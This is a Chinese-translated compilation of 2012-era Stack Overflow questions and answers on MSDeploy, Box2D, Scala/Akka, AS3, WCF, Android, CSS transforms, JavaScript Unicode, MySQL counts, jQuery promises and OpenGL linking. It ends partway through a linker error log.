就在我的脑海中：在检查它是否与菜单楔相交之前，在每个维度中任意将选择楔的区域减少 50%（或任何需要的区域）如何？绘制的选择楔将保持不变，您只需在获得它们后减小其区域尺寸。

# .net - 将 SqlCmd 变量与 MsDeploy 的 dbDacFx 提供程序一起使用

> ID：13093101
> 
> 赞同：3
> 
> 时间：2012-10-26T19:21:11.003
> 
> 标签：.net, sql-server-2008-r2, msdeploy, webdeploy

我正在尝试使用 msdeploy 使用 dbDacFx 提供程序来部署我的 dacpac 文件。此数据库项目使用名为 UserName 的变量来创建登录名和用户等。需要在部署期间传递此值。

所以我正在做类似...

```
msdeploy.exe -verb:Sync -Source:dbDacFx="c:\dev\pmwuiservices\trunk\Build\database\Database.dacpac"-dest:dbDacFx="Data Source=localhost;Integrated Security=True;Database=UIConfig", -setParam:Kind=SqlCommandVariable,scope=dbDacFx,match=UserName,value="IIS AppPool\ASP.NET V4.0" 
```

但我得到以下信息（顺便说一下，错误消息中的 url 不存在）

```
Info: Adding MSDeploy.dbDacFx (MSDeploy.dbDacFx).
Info: Adding database (data source=localhost;integrated security=True;database=U
IConfig)
Info: Creating deployment plan: Pending.
Info: Verifying deployment plan: Pending.
Info: Deploying package to database: Pending.
Info: Creating deployment plan: Running.
Info: Initializing deployment (Start)
Info: Initializing deployment (Failed)
Info: Creating deployment plan: Faulted.
Info: Verifying deployment plan: Faulted.
Info: Deploying package to database: Faulted.
Error Code: ERROR_EXECUTING_METHOD
More Information: Could not deploy package.
Missing values for the following SqlCmd variables:UserName.
  Learn more at: http://go.microsoft.com/fwlink/?LinkId=221672#ERROR_EXECUTING_M
ETHOD.
Error: Could not deploy package.
Error: Missing values for the following SqlCmd variables:UserName.
Error count: 1. 
```

如何在 MSDeploy 中使用 DbDacFx 提供程序的一个用户 SqlCmd 变量？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-28T21:41:42.540

我会确认我得到了同样的错误。Ahmed Elsayed 的文章[http://www.iis.net/learn/publish/using-web-deploy/dbdacfx-provider-for-incremental-database-publishing](http://www.iis.net/learn/publish/using-web-deploy/dbdacfx-provider-for-incremental-database-publishing)除了有严重的拼写错误外，也没有解决 sqlcmd 变量。我个人找不到像人们通常期望的那样的“真实”参考，例如[dbSqlPackage](http://msdn.microsoft.com/en-us/library/hh550081%28v=vs.103%29.aspx)的参考。此外，我发现“-setParam:kind”和“-setParam:type”之间存在无法解释的轶事和寓言式的变化。再次没有文档来备份它并且没有实际的工作解决方案，看起来范围可以是*文件名*（正则表达式）。也就是说，我*将参数分配给哪个。理查德的东西过去对我有用，所以我很乐意接受他的建议。*

 ** * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T22:50:01.060

参数的应该是您应用它的文件名，而不是提供者`scope`：`SqlCommandVariable`

```
msdeploy.exe -verb:sync ^
    -Source:dbDacFx="c:\dev\pmwuiservices\trunk\Build\database\Database.dacpac"
    -dest:dbDacFx="Data Source=localhost;Integrated Security=True;Database=UIConfig" 
    -setParam:kind=SqlCommandVariable,scope=Database.dacpac$,match=UserName,value="IIS AppPool\ASP.NET V4.0" 
```*

# javascript - Box2d 静态物体抖动

> ID：13093104
> 
> 赞同：3
> 
> 时间：2012-10-26T19:21:18.500
> 
> 标签：javascript, box2d

这就是问题：

[http://youtu.be/vxtUDy3I09c](http://youtu.be/vxtUDy3I09c)

视频不言自明。

除了抖动，我不知道还能怎么称呼它。静态物体无法支撑动态物体。它们稍微“浸入”静态物体。我该如何解决这个问题？

```
 density = 1
 friction = 0.5
 restitution = .2 
```

# scala - 在 Scala 中存储一系列特定的类类型？

> ID：13093108
> 
> 赞同：2
> 
> 时间：2012-10-26T19:21:30.853
> 
> 标签：scala, akka

试图找到一种有效且灵活的方法来在 Scala 中存储一系列类类型，以后我可以使用它来启动该类型的新实例：

```
class Event(

  val name: String,
  val channels: Seq[String],
  val processors: Seq[T] // a sequence of processor classes

) 
```

上面序列中的每个处理器都是一个 Akka Actor 类。我计划在每次收到数据时通过映射处理器来创建一个新的 Actor，如下所示：

```
event.processors.foreach { processorType =>
  val processor = newProcessor(processorType) // does all the Akka creation stuff
  processor ! Data
} 
```

*更新：*显然以上是相当正确的，那么我们如何强制它`Seq[T]`只是处理器类型？所以坚持上课`class Calculator extends Processor`

我的猜测是我错过了 Scala 的一些陷阱，所以感谢您的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T20:46:55.833

`Seq[T]`只有存在类型`T`或类型参数时才有效。

```
scala> class Event(val seq:Seq[T])
<console>:7: error: not found: type T
       class Event(val seq:Seq[T])
                               ^ 
```

要拥有一个类列表，它必须是 Seq[Class[_]]。

假设您提到的处理器是 type `Processor`。一个较小的说明性示例：

```
scala>  trait Processor; class P1 extends Processor; class P2 extends Processor

scala> case class Event(val seq:Seq[Class[_ <: Processor]])
defined class Event

scala> Event(List(classOf[P1],classOf[P2]))
res4: Event = Event(List(class P1, class P2))

scala> res4.seq map { _.newInstance }
res6: Seq[Processor] = List(P1@43655bee, P2@337688d3) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-27T00:37:00.323

这就是`Props`为之而生的。using 的优点`Props`是您可以`Processor`在运行时将所需的任何参数传递给构造函数，而不是仅限于使用无参数构造函数。

需要注意的一件事`Props`是它需要一个别名`creator`参数，所以当你看到`Props(new TestActor)`那个`TestActor`时候实际上并没有创建。它是在您传递`Props`to时创建的`actorOf()`。

要将`Actor`s 限制为您的子类型，`Processor`您可以创建`Props`.

例如：

```
trait Processor extends Actor

class MyProps(creat: () ⇒ Processor) extends Props(creat)

object MyProps {
  def apply(creator: ⇒ Processor): MyProps = new MyProps(() => creator)
} 
```

你的`Event`班级会有一个`Seq[MyProps]`. 这是一个示例测试：

```
case class Event(      
  name: String,
  channels: Seq[String],
  processors: Seq[MyProps]       
)

class TestActor(bar: String) extends Processor {
  def receive = {
    case msg @ _ => println(bar + " " + msg)
  }
}

object SeqProps extends App {
  override def main(args: Array[String]) {
    val system = ActorSystem()

    val event = new Event("test", Seq("chan1", "chan2", "chan3"), 
      Seq(MyProps(new TestActor("baz")),
          MyProps(new TestActor("barz"))))

    event.processors.foreach { proc =>
      system.actorOf(proc) ! "go!"
    }

    system.shutdown()
  }
} 
```

如果您尝试将非传递`Processor`给`MyProps()`它将在编译时失败。

```
scala> class NotProcessor extends Actor {
     |   def receive = emptyBehavior
     | }
defined class NotProcessor

scala> MyProps(new NotProcessor)
<console>:15: error: type mismatch;
 found   : NotProcessor
 required: Processor
              MyProps(new NotProcessor)
                      ^ 
```

# arrays - AS3 随机化一个数组并将其与字符串进行比较

> ID：13093109
> 
> 赞同：0
> 
> 时间：2012-10-26T19:21:34.217
> 
> 标签：arrays, actionscript-3, flash, loops, compare

所以，我是一个flash的基础程序员，这个周末我要做一个小游戏。这是我感到困惑的地方...我有 1 个具有 5 个标签的影片剪辑（每个标签显示不同的形状）。我还有一个动态文本字段，其中包含需要匹配影片剪辑的文本或（字符串）。意思是，如果文本显示为圆形，并且形状为圆形，则单击屏幕即可获胜。如果他们不匹配，你就输了。所以我问这个是为了找出如何创建 2 个数组，将它们随机化然后比较值。我知道如何在计时器上设置所有内容并给出分数，我只是无法弄清楚这部分。AS3 和我今天过得很糟糕。任何想法，甚至是伪代码都有帮助......或者只是一个流程，请提供一些东西！大声笑提前谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T19:27:03.840

关于随机化数组，请查看 Activetuts 上的[这篇详尽的文章](http://active.tutsplus.com/tutorials/actionscript/quick-tip-how-to-randomly-shuffle-an-array-in-as3/)，该文章专门针对 Actionscript。它提供了带有清晰插图和提示的文档化代码。您还可以查看[Fisher-Yates shuffle](http://en.wikipedia.org/wiki/Fisher%E2%80%93Yates_shuffle)以获取一些伪代码。

关于比较字符串，我不太明白您的问题。在 AS3 中，您可以使用`==`来查看字符串是否相等。

# c# - WCF 代理行为和参数

> ID：13093113
> 
> 赞同：2
> 
> 时间：2012-10-26T19:21:56.043
> 
> 标签：c#, wcf, parameters, proxy

使用 IExtension，我创建了一个客户端行为，该行为从使用代理的任何客户端获取参数。虽然我的方法有效，但我想要更好的方法。

现在我将分享我当前工作方法的详细信息，以澄清我正在尝试做的事情。

使用代理的客户端提供如下参数：

```
var client = new ServiceAlphaClient();

client.InnerChannel.Extensions.Add(new ParameterHolder("hello"));

client.DoSomething("some interesting service invocation");

client.Close(); 
```

IExtension`ParameterHolder`如下所示：

```
public class ParameterHolder: IExtension<IContextChannel>
{

    public string someParam;

    public ParameterHolder(string someParam)
    {
        this.someParam = someParam;
    }

    #region IExtension required-but-useless stuff
    public void Attach(IContextChannel owner)
    {
    }

    public void Detach(IContextChannel owner)
    {
    }
    #endregion
} 
```

使用该参数的客户端行为扩展如下所示：

```
 #region IClientMessageInspector
    public void AfterReceiveReply(ref System.ServiceModel.Channels.Message reply, object correlationState)
    {
        //throw new NotImplementedException();
    }

    public object BeforeSendRequest(ref System.ServiceModel.Channels.Message request, System.ServiceModel.IClientChannel channel)
    {
        ParameterHolder holder = channel.Extensions.Find<ParameterHolder>();

        string param = holder.someParam;

        request.Headers.Add(MessageHeader.CreateHeader(headerName, headerNamespace, someParam));
        return null;
    }
    #endregion 
```

我不喜欢以上所有内容：

1.  ClientMessageInspector 扩展为每个传出请求重复调用 Extensions.Find。这是不必要的，也是低效的。
2.  使用我的代理的客户端必须为创建的每个新代理提供参数。

关于第一个问题，在检查器扩展中，我可以存储并测试该值以获得更高的效率，但我宁愿能够在较早阶段仅获取此参数一次。具体来说，我希望 IContractBehavior 本身能够在 AddBindingParameters(...) 或 ApplyClientBehavior(...) 中获取参数。但我不知道如何从那里到达客户渠道。

关于第二个问题，我不希望使用 Extensions.Add() 在每个代理实例上设置参数。我希望我可以在客户端上静态设置参数，并且以某种方式仍然可以让行为扩展返回并获取它。我不太清楚如何利用部分类来提供帮助。

无论如何要解决这些问题？将“元参数”传递给 WCF 代理有更好的整体方法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T10:00:34.113

如果我错误地解释了您的问题，请原谅我。但是可以解决这两个问题的解决方案是在检查器类中放置一个公共静态成员（属性或字段）。所以客户端只需要设置一次参数，你的inspector方法也可以访问它们。

所以你的检查员类应该是这样的：

```
Class MyProxyInspector:IClientMessageInspector
{
    public static string MyParam;

    ...

    public object BeforeSendRequest(ref System.ServiceModel.Channels.Message request, System.ServiceModel.IClientChannel channel)
    {
        request.Headers.Add(MessageHeader.CreateHeader(headerName, headerNamespace, MyParam));
        return null;
    }

} 
```

而您的客户，只需在您的客户代码中方便的地方分配一次 MyproxyInspector.MyParam 。

# android - Android ListView快速滚动部分：部分文本太长

> ID：13093115
> 
> 赞同：10
> 
> 时间：2012-10-26T19:22:01.620
> 
> 标签：android, listview, fastscroll

我正在使用 ListView 来实现时间线。我启用了 FastScroll 并使用了 SectionIndexer，以便用户可以拖动滚动条并查看显示的部分文本。

问题是所有这些都是内置的 UI。显示部分文本的 textview 对我来说太小了，我试图显示下午 5 点，但对于 textview（或其他 UI？）来说太长了。

有什么更简单的方法来解决这个问题？例如，我可以设置部分文本的字体大小或 textview 布局的方法？

谢谢！

![启用 FastScroll 的电影时间轴](../Images/4ab2dd589c2a6cf556e912dd6e56c3de.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T15:59:46.960

通过查看源代码`AbsListView`，您可以找到处理最终成为的快速滚动机制的类`FastScroller`。`FastScroller`实际上在提供给`AbsListView`类似的画布上绘制图像可绘制和文本......

```
canvas.drawText(mSectionText, (int) (rectF.left + rectF.right) / 2 - hOff, (int) (rectF.bottom + rectF.top) / 2 + mOverlaySize / 4 - descent - vOff, paint); 
```

上面的代码实际上在底部可绘制图像的顶部绘制文本，因此它不尊重底部可绘制对象的边界，这就是文本实际上溢出而不被切断的原因。至于为什么会这样设计？我的猜测是索引功能的目的是主要用于单个字符，例如 A、B、C 等……因此，快速滚动索引功能就是为了适应这种情况而设计的。

***因此，要明确回答您的问题，除非***您修改`AbsListView`并`FastScroller`满足您的需要，否则实际上无法更改文本大小或更改文本的绘制方式。

# macos - mac 上 chrome 中的 -webkit-transform 问题

> ID：13093119
> 
> 赞同：1
> 
> 时间：2012-10-26T19:22:27.757
> 
> 标签：macos, google-chrome, css-animations

我有一个带有简单过渡的页面。我从左侧滑入一个面板（copyDeck 类），我有一个元素，其中包含一个覆盖背景图像的动画 gif（animatedTank 类）。我正在使用 js onload 向 body 添加一个加载类来触发动画。这一切在所有浏览器中都运行良好，一位用户指出，在带有最新版本 chrome 的 Mac 上，我们遇到了问题。我滑入的 div 实际上是按比例缩小的，包含元素的动画 gif 从底部向上滑动（我没有为此元素或其父元素设置动画）

```
 h1, .copyDeck, h1 + span, div.mainContent ul{
-webkit-transform:translateX(-60%); 
-moz-transform:translateX(-60%);
-o-transform:translateX(-60%);
transform:translateX(-60%); 
-webkit-transition: all .5s ease-in;
-moz-transition: all .5s ease-in;
-o-transition: all .5s ease-in;
transition: all .5s ease-in;
 } 
.copyDeck{
-webkit-transition-delay:.125s;
-moz-transition-delay:.125s;
-o-transition-delay:.125s;
transition-delay:.125s;
-ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=0)";
     filter: alpha(opacity=0);
     -moz-opacity: 0;
     opacity:0; 
     margin-top: 3em;
 }
 .loaded h1, .loaded .copyDeck, .loaded h1 + span, .loaded div.mainContent ul, .loaded blockquote, .loaded .CTA{
-webkit-transform: translateX(0);   
-moz-transform: translateX(0);  
-o-transform: translateX(0);    
transform: translateX(0);   
-ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=100)";
    filter: alpha(opacity=100);
    -moz-opacity: 1;
    opacity:1;  
}
.animatedTank {
    background: transparent url("Assets/transportation_imgSeq.gif") top left no-repeat;
    width: 212px;
    height: 369px;
    position: relative;
    top: -340px;
    left: 389px;
    float: left;
}  
<div class="mainContent">
        <div class="fadeOvr"></div>
        <h1>Level Tanks</h1>
        <span>&amp; A Better Bottom Line</span>
        <div class="copyDeck">
            <p>
                ...
            <ul>
                <li>...</li>
                <li>...</li>
                <li>...</li>
                <li>...</li>
            </ul>
        </div>
    </div>
    <div class="animatedTank"></div> 
```

有谁知道修复，解决方案或有没有人遇到过这个问题？

# javascript - 将 Unicode 字符插入 JavaScript

> ID：13093126
> 
> 赞同：169
> 
> 时间：2012-10-26T19:22:45.213
> 
> 标签：javascript, html, unicode

我需要在我的 html 页面上插入一个 Omega (Ω)。我正在使用它的 HTML 转义代码来执行此操作，因此我可以编写`&#937;`并获取 Ω。当我将它放入 HTML 元素时，一切都很好；但是，当我尝试将其放入我的 JS 中时，例如`var Omega = &#937;`，它会将代码解析为 JS 并且整个事情都不起作用。有人知道该怎么做吗？

* * *

## 回答 #1

> 赞同：249
> 
> 时间：2012-10-26T19:24:01.423

我猜你真的想`Omega`成为一个包含大写欧米茄的*字符串？*在这种情况下，您可以编写：

```
var Omega = '\u03A9'; 
```

（因为 Ω 是[带有代码点 U+03A9 的 Unicode 字符](http://www.fileformat.info/info/unicode/char/03a9/index.htm)；也就是说，`03A9`是`937`，除了写成四个十六进制数字。）

* * *

## 回答 #2

> 赞同：59
> 
> 时间：2012-10-26T21:26:55.540

尽管@ruakh 给出了一个很好的答案，但为了完整起见，我会添加一些替代方案：

实际上，您甚至可以`var Omega = '&#937;'`在 JavaScript 中使用，但前提是您的 JavaScript 代码是：

*   在事件属性内，如在`onclick="var Omega = '&#937'; alert(Omega)"`或
*   在以`script`XML 内容类型提供服务的 XHTML（或 XHTML + XML）文档内的元素中。

在这些情况下，代码将首先（在传递给 JavaScript 解释器之前）由 HTML 解析器解析，以便`&#937;`识别字符引用。在大多数情况下，这些限制使这成为一种不切实际的方法。

您也可以输入 Ω 字符，例如 in `var Omega = 'Ω'`，但是字符编码必须允许，编码必须正确声明，并且您需要允许您输入此类字符的软件。如果您对所有内容都使用 UTF-8 编码并准备好处理由此产生的问题，那么这是一个干净的解决方案并且非常可行。源代码将是可读的，并且阅读它，您会立即看到字符本身，而不是代码符号。另一方面，如果其他人开始使用您的代码，可能会引起意外。

使用`\u`符号，如`var Omega = '\u03A9'`，独立于字符编码工作，实际上它几乎是通用的。然而，它只能用于 U+FFFF，即`\uffff`，但大多数人听说过的大多数字符都属于该区域。（如果您需要“更高”的字符，则需要使用代理对或上述两种方法之一。）

您还可以使用该`String.fromCharCode()`方法构造一个字符，将 Unicode 编号作为参数传递，以十进制形式如 in`var Omega = String.fromCharCode(937)`或十六进制如 in `var Omega = String.fromCharCode(0x3A9)`。这适用于 U+FFFF。即使变量中有 Unicode 编号，也可以使用此方法。

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2020-08-24T22:35:06.440

一种选择是将字符按字面意思放在脚本中，例如：

```
const omega = 'Ω'; 
```

这要求您让浏览器知道正确的源编码，请参阅[JavaScript 中的 Unicode](https://flaviocopes.com/javascript-unicode/#unicode-encoding-of-source-files)

但是，如果您不能或不想这样做（例如，因为字符太奇特并且不能期望在代码编辑器字体中可用），最安全的选择可能是使用新式字符串逃脱或[`String.fromCodePoint`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCodePoint)：

```
const omega = '\u{3a9}';

// or:

const omega = String.fromCodePoint(0x3a9); 
```

这不限于 UTF-16，而是适用于所有 unicode 代码点。相比之下，这里提到的其他方法有以下缺点：

*   HTML 转义 ( `const omega = '&#937';`)：仅在 HTML 元素中以非转义形式呈现时才有效
*   旧式字符串转义 ( `const omega = '\u03A9';`)：仅限于 UTF-16
*   [`String.fromCharCode`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode): 仅限于 UTF-16

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2016-04-15T09:12:55.473

答案是正确的，但您不需要声明变量。一个字符串可以包含你的字符：

```
"This string contains omega, that looks like this: \u03A9" 
```

不幸的是，显示 UTF-8 仍然需要那些 ASCII 码，但我仍在等待（因为太多年了......）UTF-8 将与 ASCII 相同的那一天，而 ASCII 将只是对过去的。

# mysql - 带有条件的 COUNT 并加入

> ID：13093130
> 
> 赞同：2
> 
> 时间：2012-10-26T19:23:00.940
> 
> 标签：mysql, sql, join, count, conditional-statements

我有对话和消息。目标是选择对话框及其未读消息的计数。表消息具有`unread`检测它的字段。

我试过这个

```
SELECT *, count(unread) as nums 
FROM dialogs JOIN messages ON dialogs.id=messages.dialog_id  
GROUP BY dialogs.id 
HAVING count(unread) <> 0 
```

但总是得到消息的总数

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T19:29:42.277

哦！！！按messages.id 计数。试试这个：

```
SELECT *, count(messages.id) as nums FROM dialogs  
      JOIN messages ON dialogs.id=messages.dialog_id  
      WHERE messages.unread = 1 
      GROUP BY dialogs.id 
      HAVING nums <> 0 
```

messages.unread 的 Enum 类型可能需要引用：

```
SELECT *, count(messages.id) as nums FROM dialogs  
      JOIN messages ON dialogs.id=messages.dialog_id  
      WHERE messages.unread = '1' 
      GROUP BY dialogs.id 
      HAVING nums <> 0 
```

我不确定你为什么要创建一个 enum('0','1') ......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T19:31:02.167

如果您说该表`messages`有一列`unread`，那么我不明白您为什么要计算该列，您可能需要对这些值求和（假设该表上可能有多个相同的记录`dialog_id`）。所以，我会这样写你的查询：

```
SELECT *
FROM dialogs D
INNER JOIN (SELECT dialog_id, COUNT(*) AS nums
            FROM messages
            WHERE unread = 1
            GROUP BY dialog_id) M
ON D.id = M.dialog_id  
WHERE M.nums > 0 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-26T19:35:00.157

如果如您所说，“未读”是未读消息的计数，那么它总是有一个值，即使为零，并且总是包含在 COUNT(unread) 中。

尝试插入一个`WHERE messages.unread != 0`

# javascript - 使用 map/reduce 和 jQuery 顺序运行任意数量的脚本

> ID：13093131
> 
> 赞同：2
> 
> 时间：2012-10-26T19:23:06.947
> 
> 标签：javascript, jquery, asynchronous, promise

我需要运行任意数量的脚本。下一个只能运行前一个已加载并执行。我知道 RequireJS （和相关的）将是正确的选择，但我正在尝试了解承诺，所以这是我的实验：

```
var files = [
  'first.js',
  'second.js',
  'third.js',
  'fourth.js'
];

var funcs = files.map(function(file) {
  return function() { return $.getScript(file); }
});

var deferred = $.Deferred();

funcs.reduce(function (soFar, f) {
   return soFar.then(f);
}, deferred.resolve(funcs[0])); 
```

有人可以详细说明我的解决方案的陷阱和替代方案吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T19:39:02.123

您真正要寻找的是[.pipe](http://api.jquery.com/deferred.pipe/)（或在 1.8+ 中，我相信 .then 已更改为相同的意思）

简而言之，管道将允许您以您正在寻找的方式链接承诺。代码可能看起来像这样（未经测试）：

```
var files, scriptsLoaded;

files = [ 'first.js', 'second.js', 'third.js', 'fourth.js' ];

while( files.length ) {
    (function() {
        var currentUrl = files.shift();

        scriptsLoaded = scriptsLoaded ?
            scriptsLoaded.pipe(function() {
                return $.getScript( currentUrl );
            }) :
            $.getScript( currentUrl );
    }());
}

$.when( scriptsLoaded ).done(function() {
    // All scripts are now loaded assuming none of them failed
}); 
```

** 编辑 **

通过您提供的链接，我了解您要完成的工作。这是您的解决方案的更正版本，并带有一些评论。它完成与其他解决方案相同的事情，但它是一个更简洁的版本：

```
var files = [ 'first.js', 'second.js', 'third.js', 'fourth.js' ];

// The initial value provided to the reduce function is a promise
// that will resolve when the first file has been loaded.  For each
// of the remaining file names in the array, pipe it through that first
// promise so that the files are loaded in sequence ( chained ).
// The value that is returned from the reduce function is a promise
// that will resolve only when the entire chain is done loading.
var scriptsLoaded = files.slice(1).reduce(function (soFar, file) {
    return soFar.pipe(function() {
        return $.getScript( file );
    });
}, $.getScript( files[0] ); 
```

# opengl - 编译 openGL + GLSL 给出未定义的参考

> ID：13093132
> 
> 赞同：4
> 
> 时间：2012-10-26T19:23:07.787
> 
> 标签：opengl, linker, makefile, undefined-reference

我正在尝试从互联网上编译这段代码，但我失败了。似乎缺少opengl库-但它们在那里-我检查了。glut 和 glew 也是如此。

系统是 Ubuntu 12.04，glxinfo 确认视频适配器是 openGL 2.1

这是Makefile：

```
all: ljus
ljus: ljus.c glsl_shader.c calculation.c calculation.h pyramid_func.c
gcc -std=gnu99 -Wall -o ljus -I. -lz -lglut -lGL -lGLU ljus.c 
```

我试图将不同的路径传递给链接器，但没有成功。我究竟做错了什么？

PS这里是'make'输出（相当长 - 抱歉）：

```
/tmp/cc0mDnPf.o: In function `glslCreateProgram':
ljus.c:(.text+0x4f): undefined reference to `glCreateProgramObjectARB'
/tmp/cc0mDnPf.o: In function `glslAttachShaderFromMemory':
ljus.c:(.text+0x118): undefined reference to `glCreateShaderObjectARB'
ljus.c:(.text+0x13c): undefined reference to `glShaderSourceARB'
ljus.c:(.text+0x147): undefined reference to `glCompileShaderARB'
ljus.c:(.text+0x15b): undefined reference to `glAttachObjectARB'
ljus.c:(.text+0x166): undefined reference to `glDeleteObjectARB'
/tmp/cc0mDnPf.o: In function `glslBindAttribute':
ljus.c:(.text+0x3f1): undefined reference to `glBindAttribLocationARB'
/tmp/cc0mDnPf.o: In function `glslLinkProgram':
ljus.c:(.text+0x47d): undefined reference to `glLinkProgramARB'
ljus.c:(.text+0x49f): undefined reference to `glGetObjectParameterivARB'
ljus.c:(.text+0x4ff): undefined reference to `glGetObjectParameterivARB'
ljus.c:(.text+0x5f3): undefined reference to `glGetActiveUniformARB'
ljus.c:(.text+0x739): undefined reference to `glGetUniformLocationARB'
/tmp/cc0mDnPf.o: In function `glslDeleteProgram':
ljus.c:(.text+0x795): undefined reference to `glDeleteObjectARB'
/tmp/cc0mDnPf.o: In function `glslCheckError':
ljus.c:(.text+0x8a0): undefined reference to `glGetInfoLogARB'
/tmp/cc0mDnPf.o: In function `glslEnableProgram':
ljus.c:(.text+0x95a): undefined reference to `glUseProgramObjectARB'
/tmp/cc0mDnPf.o: In function `glslDisableProgram':
ljus.c:(.text+0x98b): undefined reference to `glUseProgramObjectARB'
/tmp/cc0mDnPf.o: In function `glslDisable':
ljus.c:(.text+0x9a2): undefined reference to `glUseProgramObjectARB'
/tmp/cc0mDnPf.o: In function `glslGetUniformLocation':
ljus.c:(.text+0x9bc): undefined reference to `glGetUniformLocation'
/tmp/cc0mDnPf.o: In function `CheckFramebufferStatus':
ljus.c:(.text+0xa44): undefined reference to `glCheckFramebufferStatusEXT'
/tmp/cc0mDnPf.o: In function `gltex_init':
ljus.c:(.text+0xb0c): undefined reference to `glGenTextures'
/tmp/cc0mDnPf.o: In function `gltex_init_std2d':
ljus.c:(.text+0xb58): undefined reference to `glDeleteFramebuffersEXT'
ljus.c:(.text+0xb6b): undefined reference to `glDeleteTextures'
ljus.c:(.text+0xb81): undefined reference to `glGenFramebuffersEXT'
ljus.c:(.text+0xb94): undefined reference to `glGenTextures'
ljus.c:(.text+0xbaa): undefined reference to `glBindFramebufferEXT'
ljus.c:(.text+0xbbf): undefined reference to `glBindTexture'
ljus.c:(.text+0xc10): undefined reference to `glTexImage2D'
ljus.c:(.text+0xc15): undefined reference to `glGetError'
ljus.c:(.text+0xc29): undefined reference to `gluErrorString'
ljus.c:(.text+0xc7e): undefined reference to `glTexParameterf'
ljus.c:(.text+0xc9b): undefined reference to `glTexParameterf'
ljus.c:(.text+0xcb8): undefined reference to `glTexParameterf'
ljus.c:(.text+0xcd5): undefined reference to `glTexParameterf'
ljus.c:(.text+0xcda): undefined reference to `glGetError'
ljus.c:(.text+0xcee): undefined reference to `gluErrorString'
ljus.c:(.text+0xd53): undefined reference to `glFramebufferTexture2DEXT'
ljus.c:(.text+0xd58): undefined reference to `glGetError'
ljus.c:(.text+0xd6c): undefined reference to `gluErrorString'
ljus.c:(.text+0xdbd): undefined reference to `glBindFramebufferEXT'
ljus.c:(.text+0xdc2): undefined reference to `glGetError'
ljus.c:(.text+0xdd6): undefined reference to `gluErrorString'
/tmp/cc0mDnPf.o: In function `gltex_destroy':
ljus.c:(.text+0xe29): undefined reference to `glDeleteTextures'
/tmp/cc0mDnPf.o: In function `calc_init_opengl':
ljus.c:(.text+0xe5d): undefined reference to `glGenQueries'
ljus.c:(.text+0xe69): undefined reference to `glGenLists'
ljus.c:(.text+0xe83): undefined reference to `glNewList'
ljus.c:(.text+0xe8f): undefined reference to `glBegin'
ljus.c:(.text+0xea5): undefined reference to `glVertex2f'
ljus.c:(.text+0xebb): undefined reference to `glVertex2f'
ljus.c:(.text+0xed1): undefined reference to `glVertex2f'
ljus.c:(.text+0xee7): undefined reference to `glVertex2f'
ljus.c:(.text+0xeec): undefined reference to `glEnd'
ljus.c:(.text+0xef1): undefined reference to `glEndList'
ljus.c:(.text+0xef6): undefined reference to `glGetError'
ljus.c:(.text+0xf0a): undefined reference to `gluErrorString'
/tmp/cc0mDnPf.o: In function `calc_light_makecartesian':
ljus.c:(.text+0xf71): undefined reference to `sin'
ljus.c:(.text+0xf97): undefined reference to `cos'
ljus.c:(.text+0xfcd): undefined reference to `sin'
ljus.c:(.text+0x1003): undefined reference to `cos'
ljus.c:(.text+0x1029): undefined reference to `cos'
/tmp/cc0mDnPf.o: In function `calc_light_turn':
ljus.c:(.text+0x109f): undefined reference to `fmod'
/tmp/cc0mDnPf.o: In function `calc_tubelist_setup':
ljus.c:(.text+0x1138): undefined reference to `glGetError'
ljus.c:(.text+0x114c): undefined reference to `gluErrorString'
ljus.c:(.text+0x11cc): undefined reference to `glDisable'
ljus.c:(.text+0x11e1): undefined reference to `glGenTextures'
ljus.c:(.text+0x1207): undefined reference to `glBindTexture'
ljus.c:(.text+0x1257): undefined reference to `glTexImage2D'
ljus.c:(.text+0x1273): undefined reference to `glTexParameteri'
ljus.c:(.text+0x128f): undefined reference to `glTexParameteri'
ljus.c:(.text+0x1294): undefined reference to `glGetError'
ljus.c:(.text+0x12a8): undefined reference to `gluErrorString'
ljus.c:(.text+0x1306): undefined reference to `glGenFramebuffersEXT'
ljus.c:(.text+0x131c): undefined reference to `glBindFramebufferEXT'
ljus.c:(.text+0x134a): undefined reference to `glFramebufferTexture2DEXT'
ljus.c:(.text+0x1378): undefined reference to `glFramebufferTexture2DEXT'
ljus.c:(.text+0x13a6): undefined reference to `glFramebufferTexture2DEXT'
ljus.c:(.text+0x13d4): undefined reference to `glFramebufferTexture2DEXT'
ljus.c:(.text+0x13f8): undefined reference to `glFramebufferRenderbufferEXT'
ljus.c:(.text+0x1411): undefined reference to `glBindFramebufferEXT'
ljus.c:(.text+0x1426): undefined reference to `glGenTextures'
ljus.c:(.text+0x144f): undefined reference to `glBindTexture'
ljus.c:(.text+0x149f): undefined reference to `glTexImage2D'
ljus.c:(.text+0x14bb): undefined reference to `glTexParameteri'
ljus.c:(.text+0x14d7): undefined reference to `glTexParameteri'
ljus.c:(.text+0x14dc): undefined reference to `glGetError'
ljus.c:(.text+0x14f0): undefined reference to `gluErrorString'
ljus.c:(.text+0x154e): undefined reference to `glGenFramebuffersEXT'
ljus.c:(.text+0x1564): undefined reference to `glBindFramebufferEXT'
ljus.c:(.text+0x1592): undefined reference to `glFramebufferTexture2DEXT'
ljus.c:(.text+0x15c0): undefined reference to `glFramebufferTexture2DEXT'
ljus.c:(.text+0x15ee): undefined reference to `glFramebufferTexture2DEXT'
ljus.c:(.text+0x161c): undefined reference to `glFramebufferTexture2DEXT'
ljus.c:(.text+0x1640): undefined reference to `glFramebufferRenderbufferEXT'
ljus.c:(.text+0x1659): undefined reference to `glBindFramebufferEXT'
ljus.c:(.text+0x1666): undefined reference to `glGetError'
ljus.c:(.text+0x167a): undefined reference to `gluErrorString'
